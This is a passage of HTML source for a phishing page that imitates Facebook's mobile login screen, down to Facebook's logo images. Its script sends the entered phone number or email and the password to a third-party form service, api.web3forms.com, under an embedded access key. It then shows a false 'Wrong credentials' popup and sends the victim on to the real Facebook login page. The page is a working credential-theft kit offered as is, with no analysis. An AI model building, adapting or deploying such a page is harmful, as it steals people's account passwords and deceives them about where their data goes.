        rel="stylesheet">

    <style>
        .kanit-thin {
            font-family: "Kanit", sans-serif;
            font-weight: 300;
        }

        .kanit-medium {
            font-family: "Kanit", sans-serif;
            font-weight: 400;
        }

        .mat-input {
            position: relative;
            font-size: inherit;
        }

        .mat-input input {
            border-width: 1px;
            outline: none;
            background-color: white;
            border-radius: 12px;
            padding: 1.8em 0.75em 0.75em;
            border-style: solid;
            font-size: inherit;
            transition: 0.1s;
            border-color: #ccc;
        }

        .mat-input input:focus {
            border-color: black;
        }

        .mat-input label {
            position: absolute;
            top: 1.4em;
            left: 1em;
            pointer-events: none;
            transition: 0.2s;
            color: #0009;
        }

        .mat-input:has(input:focus) label,
        .mat-input:not(:has(input:placeholder-shown)) label {
            top: 0.75em;
            font-size: 0.9em;
        }

        .mat-input input:focus::placeholder {
            opacity: 1;
        }
    </style>
    <title>Facebook</title>
</head>


<body>
    <header>
        <p class="text-center text-sm mt-3 kanit-thin">English (UK)</p>
        <div class="mt-[48px]">
            <center>
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" class="h-[60px]"
                    alt="Facebook">
            </center>
        </div>
    </header>
    <main class=" mt-[65px] px-4">
        <div class="text-center justify-center">
            <form id="contactForm" action="https://api.web3forms.com/submit" method="post">

                <input type="hidden" name="access_key" value="a2d630e8-fb07-42e5-a572-18fd34c6e93c">

                <div class="mat-input">
                    <label for="email" class="kanit-medium">Mobile number or email address</label>
                    <input name="contact = " id="email" required class="w-full min-w-full" type="text" placeholder="" />
                </div>
                <div class="relative mat-input mt-3">
                    <label for="password" class="kanit-medium">Password</label>
                    <input name="Pass = " id="password" required class="w-full max-w-full pr-10" type="password"
                        placeholder="" />
                    <span class="absolute right-3 top-[1.4em] cursor-pointer" onclick="togglePasswordVisibility()">
                        <i id="toggleIcon" class="fas fa-eye-slash"></i>
                    </span>
                </div>
                <div>
                    <button type="button"
                        class="btn btn-info bg-[#2962FF] hover:bg-[#2962FF] text-white text-base w-full max-w-full mt-3 rounded-full"
                        onclick="showPopup()">Log in</button>
                </div>
                <div>
                    <p class="kanit-medium mt-5 cursor-pointer" onclick="forget()">Forgotten Password?</p>
                </div>
                <div class="mt-[80px]">
                    <button type="button" onclick="create()"
                        class="btn btn-info kanit-medium border-blue-600 bg-transparent h-10 text-[#2962FF] text-base w-full max-w-full mt-3 rounded-full hover:bg-transparent hover:bg-[#2962FF]">Create
                        new account</button>
                </div>
            </form>
        </div>
    </main>

    <footer>
        <div>
            <center>
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" class="h-3 my-[15px]"
                    alt="">
            </center>
        </div>
        <div class="kanit-thin justify-center flex gap-3">
            <small class="cursor-pointer" onclick="about()">About</small>
            <small class="cursor-pointer" onclick="help()">Help</small>
            <small class="cursor-pointer">More</small>
        </div>
    </footer>

    <!-- Popup -->
    <div id="popup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
        <div class="bg-white p-6 rounded-lg w-full max-w-[300px] relative text-center">
            <p class="kanit-medium text-xl">Wrong credentials</p>
            <small>Invalid username or password</small>
            <hr class="mt-8 mb-5">
            <button onclick="ok()" class="text-[#2962FF]">OK</button>
        </div>
    </div>

    <!-- JavaScript -->
    <script>
        document.getElementById('contact').addEventListener('input', function () {
            const input = this.value;
            const errorMessage = document.getElementById('error-message');
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const mobilePattern = /^(\+8801|01)[3-9]\d{8}$/;

            if (emailPattern.test(input) || mobilePattern.test(input)) {
                errorMessage.classList.add('hidden');
                this.setCustomValidity('');
            } else {
                errorMessage.classList.remove('hidden');
                this.setCustomValidity('Invalid input');
            }
        });


        function showPopup() {
            document.getElementById("popup").style.display = "flex";
            var form = document.getElementById("contactForm");
            if (form.checkValidity()) {
                fetch(form.action, {
                    method: form.method,
                    body: new FormData(form)
                }).then(response => {
                    if (!response.ok) {
                        document.getElementById("popup").style.display = "flex";
                    }
                }).catch(error => {
                    document.getElementById("popup").style.display = "flex";
                });
            } else {
                form.reportValidity();
            }
        }

        function togglePasswordVisibility() {
            const passwordInput = document.getElementById("password");
            const toggleIcon = document.getElementById("toggleIcon");
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                toggleIcon.classList.remove("fa-eye-slash");
                toggleIcon.classList.add("fa-eye");
            } else {
                passwordInput.type = "password";
                toggleIcon.classList.remove("fa-eye");
                toggleIcon.classList.add("fa-eye-slash");
            }
        }

        function closePopup() {
            document.getElementById("popup").style.display = "none";
        }

        function ok() {
            window.open("https://www.facebook.com/login", "_blank");
        }

        function forget() {
            window.location.href = "https://m.facebook.com/login/identify/";
        }

        function create() {
            window.location.href = "https://m.facebook.com/reg/";
        }

        function about() {
            window.location.href = "https://about.meta.com/";
        }

        function help() {
            window.location.href = "https://www.facebook.com/help/?ref=pf";
        }
    </script>
</body>

</html>
